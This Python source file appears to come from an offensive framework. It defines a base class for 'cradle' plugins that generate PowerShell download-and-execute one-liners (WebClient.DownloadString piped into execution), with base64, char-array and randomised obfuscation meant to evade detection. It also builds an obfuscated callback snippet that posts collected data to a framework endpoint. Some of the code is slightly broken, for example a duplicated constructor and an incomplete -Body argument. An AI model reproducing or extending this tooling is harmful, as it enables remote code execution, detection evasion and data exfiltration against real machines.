import base64

from abc import ABC, abstractmethod
from typing import Any, Dict, List
from core.endpoint_registry import EndpointRegistry
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr

class BaseCradlePlugin(ABC):
    NAME: str = "undefined"
    DESCRIPTION: str = "No description"
    AUTHOR: str = "Unknown"
    CONTENT_TYPE: str = "text/plain"
    
    OPTIONS: Dict[str, Dict[str, Any]] = {
        "CONTENT_OBFUSCATION": {
            "description": (
                "Payload obfuscation applied by the core before serving: "
                "none | base64 | char | getrandom"
            ),
            "default": "getrandom",
        },
        "CRADLE_OBFUSCATION": {
            "description": (
                "Cradle command obfuscation applied by the core before serving: "
                "none | base64 | char | getrandom"
            ),
            "default": "getrandom"
        },
        "NEXT_CRADLE": {
            "description": {
                "Next cradle to call when completed; set to UID or Index"
            },
            "default": 0
        }
    }

    def __init__(self):
        self._endpoint_registry = None

    def __init__(self, endpoint_registry: EndpointRegistry):
        self._endpoint_registry = endpoint_registry
    
    @abstractmethod
    def generate(self, options: dict, obfuscated: bool = True) -> str:
        """Return the raw cradle payload as a string (no encoding applied)."""
        pass

    def cradle_command(self, cradle_url: str, options: dict) -> str:
        obs_cradle = options.get("CRADLE_OBFUSCATION","none").lower()
        cradle = f".((New-Object System.Net.WebClient).DownloadString({cradle_url}));"

        if obs_cradle == "base64":
            return f".([System.Text.Encoding]::UTF8::GetString([System.Convert]::FromBase64String({base64.b64encode(cradle.encode("utf-16-le")).decode()})));"
        elif obs_cradle == "char":
            return f".(-join({[f"[char]{ord(c)}" for c in list(cradle)]}));"
        elif obs_cradle == "getrandom":
            return f".({sgr(cradle)});"
        return f"{cradle}"
    
    def notification_callback_snippet(self, header_var_dict: dict) -> str:
        notification_channel = self._endpoint_registry.create_notification_channel_for(self.uid)
        snippet = f"""
$responseJson = @{{
{"\n".join(f"\t{x} = {header_var_dict[x]} | Out-String" for x in header_var_dict.keys())}
}} | ConvertTo-Json
Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification_channel.uid)}" -Method Post -Body
        """
        return f".({sgr(snippet)});"

    
    def validate(self, options: dict) -> List[str]:
        errors = []
        merged = self.get_options_with_defaults(options)
        for name, spec in self.OPTIONS.items():
            if spec.get("required", False) and not merged.get(name, ""):
                errors.append(f"Required option '{name}' is not set")
        return errors
    
    def get_options_with_defaults(self, options: dict) -> dict:
        result = {}
        for name, spec in self.OPTIONS.items():
            if name in options and options[name] != "":
                result[name] = options[name]
            elif "default" in spec:
                result[name] = spec["default"]
            else:
                result[name] = ""
        return result
    
